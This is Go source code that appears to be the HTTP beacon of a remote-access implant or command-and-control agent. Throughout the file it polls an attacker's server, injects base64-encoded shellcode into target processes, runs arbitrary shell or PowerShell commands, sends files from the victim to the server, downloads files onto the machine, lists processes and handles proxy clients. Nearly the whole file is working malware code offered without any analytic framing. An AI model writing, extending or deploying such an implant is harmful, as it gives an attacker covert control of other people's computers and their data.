package main

import (
	"os"
	"io"
	"fmt"
	"time"
	"bufio"
	"bytes"
	"strconv"
	"os/exec"
	"strings"
	"runtime"
	"net/http"
	"encoding/json"
    "mime/multipart"
	b64 "encoding/base64"
	ps "github.com/mitchellh/go-ps"
)

func (packet BeaconHttp) exitHandler() {
	data, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"quit",[]byte("quit")})
	debugFatal(err)
	encoded := b64.StdEncoding.EncodeToString(data)
	queryCommandHttp(encoded)
	os.Exit(1)
}

func (packet BeaconHttp) queryServer() {
	resp, err := queryCommandHttp(string(packet.data))
	debugFatal(err)

	if err == nil {
		defer resp.Body.Close()

		if err != nil || resp.Status != "200 OK" {
			fmt.Println("Command status != 200: " + resp.Status)
		}
		
		controlDataBytes, err := io.ReadAll(resp.Body)
		debugFatal(err)

		var commResp CommandResponse
		json.Unmarshal(controlDataBytes, &commResp)
		
		packet.handleQueryResponse(commResp)
	} else if debug {
		fmt.Println("Couldn't reach command.")
	}
}

func (packet BeaconHttp) addProxyClient(client Beacon) {
	packet.proxyClients = append(packet.proxyClients, client)
}

func queryCommandHttp(endpoint string) (resp *http.Response, err error) {
	url := "http://" + cmdAddress + ":" + cmdPort + "/" + endpoint
	req, err := http.NewRequest("GET", url, nil)
	debugFatal(err)
	req.Host = cmdHost
	return netClient.Do(req)
}

func (packet BeaconHttp) handleQueryResponse(commResp CommandResponse) {
	for i := 0; i < len(commResp.Shellcode); i += 2 {
		shellcode := commResp.Shellcode[i]
		procId, err := strconv.Atoi(commResp.Shellcode[i+1])
		fmt.Println(procId)

		if err != nil {
			debugFatal(err)
			continue
		}
		
		decodedShellcode, err := b64.StdEncoding.DecodeString(shellcode)
	
		if err != nil {
			debugFatal(err)
			continue
		}

		si := ShellcodeInjector {decodedShellcode, procId}
		go func() {
			si.inject()
		}()
	}

	for _, file := range commResp.Download {
		packet.upload(file)
	}

	for _, file := range commResp.Upload {
		packet.download(file)
	}

	for _, client := range commResp.ProxyClients {
		var beacon Beacon
		json.Unmarshal([]byte(client), &beacon)
		fmt.Println("Adding proxy " + beacon.Id)
		packet.addProxyClient(beacon)
	}

	for _, cmd := range commResp.Exec {
		cmdSplit := strings.Fields(cmd);
		output := []byte{}
		
		if cmdSplit[0] == "migrate" {
			time.Sleep(10 * time.Second)
			packet.exitHandler()
		}

		if cmdSplit[0] == "exit" || cmdSplit[0] == "quit" {
			packet.exitHandler()
		}

		if cmdSplit[0] == "plist" {
			procs := "------------------------------\nPID\tPPID\tName\n------------------------------"
			procList, _ := ps.Processes()
			
			for _, p := range procList {
				procs += "\n" + strconv.Itoa(p.Pid()) + "\t" + strconv.Itoa(p.PPid()) + "\t" + p.Executable()
			}

			data, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"plist",[]byte(procs)})
			debugFatal(err)
			encoded := b64.StdEncoding.EncodeToString(data)
			queryCommandHttp(encoded)
			return
		}
		
		var cmdHandle *exec.Cmd

		if runtime.GOOS == "linux" {
			command := []string{ "-c", cmd }
			cmdHandle = exec.Command("/bin/sh", command...)
		} else if runtime.GOOS == "windows" {
			command := []string { "-c", cmd }
			cmdHandle = exec.Command("powershell", command...)
		}

		stderr, err := cmdHandle.StderrPipe()
		stdout, err := cmdHandle.StdoutPipe()
		
		if err = cmdHandle.Start(); err == nil {
			scanner := bufio.NewScanner(stderr)
			
			if err != nil {
				output = append(output, scanner.Text()...)
				output = append(output, '\n')
			}

			for scanner.Scan() {
				output = append(output, scanner.Text()...)
				output = append(output, '\n')
			}

			scanner = bufio.NewScanner(stdout)
			
			if err != nil {
				output = append(output, scanner.Text()...)
				output = append(output, '\n')
			}

			for scanner.Scan() {
				output = append(output, scanner.Text()...)
				output = append(output, '\n')
			}
		}
		
		if len(output) > 0 {
			data, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"exec",output})
			debugFatal(err)
			encoded := b64.StdEncoding.EncodeToString(data)
			queryCommandHttp(encoded)
		}
	}
}

func (packet BeaconHttp) download(filePath string) {
	filename := filePath
	if filename[0] == '/' || filename[0] == '~' {
		f := strings.Split(filename, "/")
		filename = f[len(f)-1]
	}

	result := "0"

	url := "http://" + cmdAddress + ":" + cmdPort + "/d/" + b64.StdEncoding.EncodeToString([]byte(filePath))
	req, err := http.NewRequest("GET", url, nil)
	debugFatal(err)
	req.Host = "command.com"
	resp, err := netClient.Do(req)
	fmt.Println(url)
	debugFatal(err)
	defer resp.Body.Close()
	targetDir := ""

	for _, loc := range writeCheckLocations {
		out, err := os.Create(loc + "/" + filename)
		debugFatal(err)

		if err != nil {
			continue
		}

		defer out.Close()

		_, err = io.Copy(out, resp.Body)
		debugFatal(err)
		
		if err != nil {
			continue
		}

		result = "1"
		targetDir = loc
		break
	}

	result += ";" + targetDir + "/" + filename

	data, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"upload", []byte(result)})
	debugFatal(err)
	
	if err != nil {
		return
	}

	encoded := b64.StdEncoding.EncodeToString(data)
	queryCommandHttp(encoded)
}

func (packet BeaconHttp) upload(filename string) {
	data, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"upload", []byte(filename)})
	debugFatal(err)
	
	if err != nil {
		return
	}

	encoded := b64.StdEncoding.EncodeToString(data)
	url := "http://" + cmdAddress + ":" + cmdPort + "/" + encoded
	
    var b bytes.Buffer
    w := multipart.NewWriter(&b)
    var fw io.Writer
    file, err := os.Open(filename)
    debugFatal(err)
	
	if err != nil {
		return
	}
	if fw, err = w.CreateFormFile("file", file.Name()); err != nil {
    	debugFatal(err)
		return
    }    
	if _, err = io.Copy(fw, file); err != nil {
		debugFatal(err)
		return
    }

    w.Close()

	req, err := http.NewRequest("POST", url, &b)
	req.Host = cmdHost
	debugFatal(err)
	req.Header.Set("Content-Type", w.FormDataContentType())
    _, err = netClient.Do(req)
	debugFatal(err)
}